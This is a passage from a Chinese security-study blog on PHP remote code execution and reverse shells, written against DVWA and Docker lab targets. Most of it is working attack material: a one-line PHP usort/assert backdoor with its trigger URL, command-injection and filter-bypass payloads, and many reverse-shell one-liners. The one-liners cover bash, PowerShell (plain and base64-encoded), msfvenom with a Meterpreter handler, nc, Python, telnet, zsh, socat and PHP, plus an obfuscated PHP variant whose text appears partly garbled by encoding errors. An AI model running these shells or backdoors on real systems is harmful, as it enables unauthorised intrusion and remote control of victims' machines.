<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"system"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"whoami"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"system"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"ipconfig"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h5 id="call-user-func-array"><a href="#call-user-func-array" class="headerlink" title="call_user_func_array()"></a>call_user_func_array()</h5><p>call_user_func_array — 调用回调函数，并把一个数组参数作为回调函数的参数</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">call_user_func_array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"system"</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"whoami"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">call_user_func_array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"system"</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"ipconfig"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h5 id="array-filter"><a href="#array-filter" class="headerlink" title="array_filter()"></a>array_filter()</h5><p>array_filter — 使用回调函数过滤数组的元素</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">array_filter</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"whoami"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"ipconfig"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"system"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<h5 id="uasort"><a href="#uasort" class="headerlink" title="uasort()"></a>uasort()</h5><p>uasort — 使用用户自定义的比较函数，保持索引和值的对应关系，原地排序 array。</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"eval"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"system('whoami')"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token function">usort</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'assert'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>木马</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
    <span class="token function">usort</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'assert'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>url连接： ?a=eval($_GET[cmd])&amp;cmd=system(whoami);</p>
<h3 id="漏洞复现-6"><a href="#漏洞复现-6" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>环境：DVWA靶场 <strong>Linux</strong></p>
<p>关卡：Command Injection（low）</p>
<p>正常功能：检测目标ip是否连通</p>
<p><img src="/2023/012220963/108.PNG" alt="108"></p>
<p>构造多条执行的命令： 127.0.0.1 &amp; whoami</p>
<p>代码审计之后可知实际执行的命令为：</p>
<pre class="line-numbers language-pphp" data-language="pphp"><code class="language-pphp">ping 127.0.0.1 &amp; whoami<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><strong>在windows操作系统中，使用&amp;符号可以执行多条命令</strong></p>
<h4 id="过滤分割符"><a href="#过滤分割符" class="headerlink" title="过滤分割符"></a>过滤分割符</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token punctuation">;</span> <span class="token comment">//两条命令都执行,windows不支持</span>
<span class="token operator">|</span> <span class="token comment">// 管道</span>
<span class="token operator">||</span> <span class="token comment">//上一条命令执行失败后，才执行下一条命令</span>
<span class="token operator">&amp;</span> <span class="token comment">//先执行command2后执行command1</span>
<span class="token operator">&amp;&amp;</span> <span class="token comment">//先执行command1后执行command2</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="RCE绕过"><a href="#RCE绕过" class="headerlink" title="RCE绕过"></a>RCE绕过</h3><h4 id="前端验证绕过"><a href="#前端验证绕过" class="headerlink" title="前端验证绕过"></a>前端验证绕过</h4><p>环境：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">docker pull tanyiqu<span class="token operator">/</span>demo<span class="token operator">-</span>rce<span class="token punctuation">:</span>simple01

docker run <span class="token operator">-</span>d <span class="token operator">-</span>p <span class="token number">8080</span><span class="token punctuation">:</span><span class="token number">80</span> tanyiqu<span class="token operator">/</span>demo<span class="token operator">-</span>rce<span class="token punctuation">:</span>simple01<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>验证输入的内容是不是正确的ip格式</p>
<p>禁用前端js即可绕过</p>
<h4 id="空格绕过-1"><a href="#空格绕过-1" class="headerlink" title="空格绕过"></a>空格绕过</h4><p>环境：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">docker pull tanyiqu<span class="token operator">/</span>demo<span class="token operator">-</span>rce<span class="token punctuation">:</span>sapce01

docker run <span class="token operator">-</span>d <span class="token operator">-</span>p <span class="token number">8080</span><span class="token punctuation">:</span><span class="token number">80</span> tanyiqu<span class="token operator">/</span>demo<span class="token operator">-</span>rce<span class="token punctuation">:</span>sapce01<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>使用以下字符可以绕过空格</p>
<ul>
<li><p>tab（%09）</p>
</li>
<li><p>space(%20)</p>
</li>
<li><p>$IFS$9</p>
</li>
<li><p>${IFS}</p>
</li>
<li><p>$IFS</p>
</li>
</ul>
<h3 id="反弹shell介绍"><a href="#反弹shell介绍" class="headerlink" title="反弹shell介绍"></a>反弹shell介绍</h3><h4 id="反弹"><a href="#反弹" class="headerlink" title="反弹"></a>反弹</h4><p>正向连接：客户端请求服务器，服务器给我们响应</p>
<p>反向连接（反弹）：目标机器发送请求链接我们的服务器。</p>
<h4 id="反弹shell基本操作"><a href="#反弹shell基本操作" class="headerlink" title="反弹shell基本操作"></a>反弹shell基本操作</h4><p>反弹shell命令生成网站：<a target="_blank" rel="noopener" href="https://www.revshells.com/">https://www.revshells.com/</a></p>
<p>设置监听者的ip和端口</p>
<p>开启监听：</p>
<p>执行反弹命令:</p>
<h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h3><h4 id="CVE-2018-8174"><a href="#CVE-2018-8174" class="headerlink" title="CVE-2018-8174"></a><strong>CVE-2018-8174</strong></h4><h2 id="RCE-反弹shell详解"><a href="#RCE-反弹shell详解" class="headerlink" title="RCE-反弹shell详解"></a>RCE-反弹shell详解</h2><h3 id="重难点"><a href="#重难点" class="headerlink" title="重难点"></a>重难点</h3><ul>
<li><p>Linux Bash方式反弹</p>
</li>
<li><p>Windows Powershell反弹</p>
</li>
<li><p>Windows Metaspolit反弹</p>
</li>
</ul>
<h3 id="Shell基础概念"><a href="#Shell基础概念" class="headerlink" title="Shell基础概念"></a>Shell基础概念</h3><h4 id="Shell"><a href="#Shell" class="headerlink" title="Shell"></a>Shell</h4><p>Shell中文意思为壳，Shell 是指一种应用程序，用户通过这个应用程序访问操作系统内核的服务。</p>
<p>Linux内核（Kernel）具有管理计算机硬件的一些功能，如进程管理、内存管理等，内核识别计算机语言，因此需要一个程序帮助 “翻译” 人类语言为计算机语言。这个程序就是Shell。shell不特指某一个程序，能提供计算机交互的程序都叫做shell。</p>
<h4 id="Shell脚本"><a href="#Shell脚本" class="headerlink" title="Shell脚本"></a>Shell脚本</h4><p>是一种为 shell 编写的脚本程序，本质上是脚本文件。</p>
<h4 id="Shell编程"><a href="#Shell编程" class="headerlink" title="Shell编程"></a>Shell编程</h4><p>指开发shell脚本，并不是指开发shell程序</p>
<h4 id="bash和sh"><a href="#bash和sh" class="headerlink" title="bash和sh"></a>bash和sh</h4><p>bash和sh是Linux中经常使用的shell</p>
<p>Linux 的 Shell脚本解释器种类众多，常见的有：</p>
<ul>
<li><p>Bourne Shell（/usr/bin/sh或/bin/sh）</p>
</li>
<li><p>Bourne Again Shell（/bin/bash）</p>
</li>
<li><p>C Shell（/usr/bin/csh）</p>
</li>
<li><p>K Shell（/usr/bin/ksh）</p>
</li>
<li><p>Z shell（/usr/bin/zsh）</p>
</li>
<li><p>Shell for Root（/sbin/sh）</p>
</li>
</ul>
<h3 id="反弹-反向连接"><a href="#反弹-反向连接" class="headerlink" title="反弹/反向连接"></a>反弹/反向连接</h3><p>反弹指的是，目标机器发送请求链接我们的服务器。</p>
<p><img src="/2023/012220963/109.PNG" alt="109"></p>
<p>什么情况下需要反弹？</p>
<ul>
<li><p>一般防火墙会拦截对内部的请求，但是对向外部的访问不做限制。</p>
</li>
<li><p>目标主机在内网，我们不能直接链接，但是目标可以出网</p>
</li>
</ul>
<h4 id="netcat瑞士军刀"><a href="#netcat瑞士军刀" class="headerlink" title="netcat瑞士军刀"></a>netcat瑞士军刀</h4><p>NetCat，在网络工具中有“瑞士军刀”美誉，其有Windows和Linux的版本。因为它短小精悍（1.84版本也不过25k，旧版本或缩减版甚至更小）、功能实用。</p>
<h5 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h5><ul>
<li><p>Kali：自带</p>
</li>
<li><p>CentOS：yum install nc</p>
</li>
<li><p>Windows：<a target="_blank" rel="noopener" href="https://eternallybored.org/misc/netcat/">https://eternallybored.org/misc/netcat/</a></p>
</li>
</ul>
<p>注：Windows中运行nc会被杀毒软件拦截，需要添加信任</p>
<h5 id="监听"><a href="#监听" class="headerlink" title="监听"></a>监听</h5><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"># nc -lvvp&#x2F;lvnp port
nc -lvvp 9999 # vv为显示更详细的信息
nc -lvnp 9999 # n为使用数值ip，不适用DNS<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<h3 id="linux反弹shell"><a href="#linux反弹shell" class="headerlink" title="linux反弹shell"></a>linux反弹shell</h3><h4 id="sh-bash"><a href="#sh-bash" class="headerlink" title="sh/bash"></a>sh/bash</h4><h5 id="Bash-i"><a href="#Bash-i" class="headerlink" title="Bash -i"></a>Bash -i</h5><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">sh -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.61.1&#x2F;9999 0&gt;&amp;1

bash -c &quot;sh -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.61.1&#x2F;9999 0&gt;&amp;1&quot;&#x2F;&#x2F;备用<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><img src="/2023/012220963/110.PNG" alt="110"></p>
<h5 id="Bash-read-line"><a href="#Bash-read-line" class="headerlink" title="Bash read line"></a>Bash read line</h5><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">exec 5&lt;&gt;&#x2F;dev&#x2F;tcp&#x2F;192.168.61.1&#x2F;9999;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/2023/012220963/113.PNG" alt="113"></p>
<h5 id="Bash5"><a href="#Bash5" class="headerlink" title="Bash5"></a>Bash5</h5><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">bash -c &quot;sh -i 5&lt;&gt; &#x2F;dev&#x2F;tcp&#x2F;192.168.61.1&#x2F;9999 0&lt;&amp;5 1&gt;&amp;5 2&gt;&amp;5&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/2023/012220963/111.PNG" alt="111"></p>
<h5 id="Bash196"><a href="#Bash196" class="headerlink" title="Bash196"></a>Bash196</h5><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">0&lt;&amp;196;exec 196&lt;&gt;&#x2F;dev&#x2F;tcp&#x2F;192.168.61.1&#x2F;9999; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/2023/012220963/112.PNG" alt="112"></p>
<h3 id="windows反弹shell"><a href="#windows反弹shell" class="headerlink" title="windows反弹shell"></a>windows反弹shell</h3><h4 id="Powershell"><a href="#Powershell" class="headerlink" title="Powershell"></a>Powershell</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">&#x2F;&#x2F;本机环境一塌糊涂
shift+鼠标右键&#x2F;&#x2F;可以打开powershell窗口，可运行脚本<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h5 id="Powershell1"><a href="#Powershell1" class="headerlink" title="Powershell1"></a>Powershell1</h5><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">powershell -nop -c &quot;$client &#x3D; New-Object System.Net.Sockets.TCPClient(&#39;192.168.111.136&#39;,9999);$stream &#x3D; $client.GetStream();[byte[]]$bytes &#x3D; 0..65535|%&#123;0&#125;;while(($i &#x3D; 
$stream.Read($bytes, 0, $bytes.Length)) -ne 0)&#123;;$data &#x3D; (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback &#x3D; (iex $data 2&gt;&amp;1 | Out-String );$sendback2 &#x3D; $sendback + &#39;PS &#39; + (pwd).Path + &#39;&gt; &#39;;$sendbyte &#x3D; 
([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()&#125;;$client.Close()&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<h5 id="Powershell2"><a href="#Powershell2" class="headerlink" title="Powershell2"></a>Powershell2</h5><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">powershell -nop -W hidden -noni -ep bypass -c &quot;$TCPClient &#x3D; New-Object 
Net.Sockets.TCPClient(&#39;192.168.61.1&#39;, 9999);$NetworkStream &#x3D; 
$TCPClient.GetStream();$StreamWriter &#x3D; New-Object 
IO.StreamWriter($NetworkStream);function WriteToStream ($String) 
&#123;[byte[]]$script:Buffer &#x3D; 0..$TCPClient.ReceiveBufferSize | % 
&#123;0&#125;;$StreamWriter.Write($String + &#39;SHELL&gt; &#39;);$StreamWriter.Flush()&#125;WriteToStream 
&#39;&#39;;while(($BytesRead &#x3D; $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) 
&#123;$Command &#x3D; ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 
1);$Output &#x3D; try &#123;Invoke-Expression $Command 2&gt;&amp;1 | Out-String&#125; catch &#123;$_ | OutString&#125;WriteToStream ($Output)&#125;$StreamWriter.Close()&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h5 id="Powershell-Base64"><a href="#Powershell-Base64" class="headerlink" title="Powershell Base64"></a>Powershell Base64</h5><p><strong>shell自动生成地址：</strong></p>
<p><a target="_blank" rel="noopener" href="https://www.revshells.com/">https://www.revshells.com/</a></p>
<p>将Powershell1中，-c后面的内容，即双引号中的内容使用base64编码</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADEAMQAxAC4AMQAzADYAIgAsADkAOQA5ADkAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/2023/012220963/114.PNG" alt="114"></p>
<p><img src="/2023/012220963/115.PNG" alt="115"></p>
<h4 id="Metaspolit"><a href="#Metaspolit" class="headerlink" title="Metaspolit"></a>Metaspolit</h4><p>Metasploit框架(Metasploit Framework，MSF)是一个开源工具，旨在方便渗透测试，他是有Ruby程序语言编写的模板化框架，具有很好的扩展性，便于渗透测试人员开发、使用定制的工具模板。几乎所有流行的操作系统都支持Metasploit框架而且Metasploit框架在这些操作系统上的工作流程基本都一样。</p>
<p><strong>反弹三部曲：</strong></p>
<ol>
<li>生成木马</li>
<li>加载监听</li>
<li>执行木马</li>
</ol>
<h5 id="生成木马"><a href="#生成木马" class="headerlink" title="生成木马"></a>生成木马</h5><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.0.106 LPORT&#x3D;9999 -f exe -o reverse.exe
msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.0.106 LPORT&#x3D;9999 -f exe -o reverse.exe
msfvenom -p windows&#x2F;x64&#x2F;meterpreter_reverse_tcp LHOST&#x3D;192.168.0.106 LPORT&#x3D;9999 -f exe -o reverse.exe
msfvenom -p windows&#x2F;x64&#x2F;shell_reverse_tcp LHOST&#x3D;192.168.0.106 LPORT&#x3D;9999 -f exe -o reverse.exe
msfvenom -p windows&#x2F;x64&#x2F;shell_reverse_tcp LHOST&#x3D;192.168.0.106 LPORT&#x3D;9999 -f exe -o reverse.exe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h5 id="加载监听"><a href="#加载监听" class="headerlink" title="加载监听"></a>加载监听</h5><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">msfconsole
msf5 &gt; use exploit&#x2F;multi&#x2F;handler
msf5 exploit(multi&#x2F;handler) &gt; set PAYLOAD payload
msf5 exploit(multi&#x2F;handler) &gt; set LHOST localhost
msf5 exploit(multi&#x2F;handler) &gt; set LPORT port
msf5 exploit(multi&#x2F;handler) &gt; run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h5 id="执行木马"><a href="#执行木马" class="headerlink" title="执行木马"></a>执行木马</h5><p><strong>执行命令时，如果出现中文乱码，使用chcp切换编码即可</strong></p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">chcp 65001<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<p>监听显示器</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">meterpreter &gt; run vnc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<h3 id="其他应用反弹shell"><a href="#其他应用反弹shell" class="headerlink" title="其他应用反弹shell"></a>其他应用反弹shell</h3><h4 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">nc -c sh 192.168.0.106 9999<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<h4 id="python2"><a href="#python2" class="headerlink" title="python2"></a>python2</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">export RHOST&#x3D;&quot;192.168.0.106&quot;;export RPORT&#x3D;9999;python -c &#39;import 
sys,socket,os,pty;s&#x3D;socket.socket();s.connect((os.getenv(&quot;RHOST&quot;),int(os.getenv(&quot;RPORT&quot;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&quot;sh&quot;)&#39;

python -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.0.106&quot;,9999));os.dup2(s.fileno(),0); 
os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;sh&quot;)&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h4 id="python3"><a href="#python3" class="headerlink" title="python3"></a>python3</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">export RHOST&#x3D;&quot;192.168.0.106&quot;;export RPORT&#x3D;9999;python3 -c &#39;import 
sys,socket,os,pty;s&#x3D;socket.socket();s.connect((os.getenv(&quot;RHOST&quot;),int(os.getenv(&quot;RPORT&quot;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&quot;sh&quot;)&#39;

python3 -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.0.106&quot;,9999));os.dup2(s.fileno(),0); 
os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;sh&quot;)&#39;

python3 -c &#39;import os,pty,socket;s&#x3D;socket.socket();s.connect((&quot;192.168.0.106&quot;,9999));
[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(&quot;sh&quot;)&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h4 id="telnet"><a href="#telnet" class="headerlink" title="telnet"></a>telnet</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">TF&#x3D;$(mktemp -u);mkfifo $TF &amp;&amp; telnet 192.168.0.106 9999 0&lt;$TF | sh 1&gt;$TF<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<h4 id="zsh"><a href="#zsh" class="headerlink" title="zsh"></a>zsh</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">zsh -c &#39;zmodload zsh&#x2F;net&#x2F;tcp &amp;&amp; ztcp 192.168.0.106 9999 &amp;&amp; zsh &gt;&amp;$REPLY 2&gt;&amp;$REPLY 0&gt;&amp;$REPLY&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<h4 id="socat"><a href="#socat" class="headerlink" title="socat"></a>socat</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">socat TCP:192.168.0.106:9999 EXEC:sh

socat TCP:192.168.0.106:9999 EXEC:&#39;sh&#39;,pty,stderr,setsid,sigint,sane<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>



<h4 id="php"><a href="#php" class="headerlink" title="php"></a>php</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">php -r &#39;$sock&#x3D;fsockopen(&quot;192.168.0.106&quot;,9999);exec(&quot;sh &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;
php -r &#39;$sock&#x3D;fsockopen(&quot;192.168.0.106&quot;,9999);shell_exec(&quot;sh &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;
php -r &#39;$sock&#x3D;fsockopen(&quot;192.168.0.106&quot;,9999);system(&quot;sh &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;
php -r &#39;$sock&#x3D;fsockopen(&quot;192.168.0.106&quot;,9999);passthru(&quot;sh &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;
php -r &#39;$sock&#x3D;fsockopen(&quot;192.168.0.106&quot;,9999);&#96;sh &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#96;;&#39;
php -r &#39;$sock&#x3D;fsockopen(&quot;192.168.0.106&quot;,9999);popen(&quot;sh &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;, &quot;r&quot;);&#39;
php -r &#39;$sock&#x3D;fsockopen(&quot;192.168.0.106&quot;,9999);$proc&#x3D;proc_open(&quot;sh&quot;, 
array(0&#x3D;&gt;$sock, 1&#x3D;&gt;$sock, 2&#x3D;&gt;$sock),$pipes);&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h4 id="php-Emoji"><a href="#php-Emoji" class="headerlink" title="php Emoji"></a>php Emoji</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">php -r
&#39;$ð•••&#x3D;&quot;1&quot;;$ð•••&#x3D;&quot;2&quot;;$ð•••&#x3D;&quot;3&quot;;$ð•••&#x3D;&quot;4&quot;;$ð•••&#x3D;&quot;5&quot;;$ð•••&#x3D;&quot;6&quot;;$ð•••&#x3D;&quot;7&quot;;$ð•••&#x3D;&quot;8&quot;;$ð•••&#x3D;&quot;9&quot;;$ð•••&#x3D;&quot;0&quot;;$ð•¤¢&#x3D;&quot; &quot;;$ð•¤•&#x3D;&quot;&lt;&quot;;$ð•¤ &#x3D;&quot;&gt;&quot;;$ð••±&#x3D;&quot;-
&quot;;$ð••µ&#x3D;&quot;&amp;&quot;;$ð•¤©&#x3D;&quot;i&quot;;$ð•¤•&#x3D;&quot;.&quot;;$ð•¤¨&#x3D;&quot;&#x2F;&quot;;$ð•¥
°&#x3D;&quot;a&quot;;$ð•••&#x3D;&quot;b&quot;;$ð••¶&#x3D;&quot;i&quot;;$ð•••&#x3D;&quot;h&quot;;$ð•••&#x3D;&quot;c&quot;;$ð•¤
£&#x3D;&quot;d&quot;;$ð•••&#x3D;&quot;e&quot;;$ð•••&#x3D;&quot;f&quot;;$ð•••&#x3D;&quot;k&quot;;$ð•••&#x3D;&quot;n&quot;;$ð•••&#x3D;&quot;o&quot;;$ð•••&#x3D;&quot;p&quot;;$ð•¤•&#x3D;&quot;s&quot;;$ð•••&#x3D;&quot;x&quot;;$ð••• &#x3D; $ð•••. $ð•¤•. $ð•••. $ð•••. $ð•••. $ð•••. $ð•••. $ð•••. $ð•••;$ð••• &#x3D; &quot;192.168.0.106&quot;;$ð••» &#x3D; 9999;$ð••• &#x3D; &quot;sh&quot;. $ð•¤¢. $ð••±. $ð•¤©. $ð•¤¢. $ð•¤•. $ð••µ. $ð•••. $ð•¤¢. $ð•¤ . $ð••µ. $ð•••. $ð•¤¢. $ð•••. $ð•¤ . $ð••µ. $ð•••;$ð•¤£ &#x3D; $ð•••($ð•••,$ð••»);$ð••½ &#x3D; $ð•••. $ð•••. $ð•••. $ð•••;$ð••½($ð•••);&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>



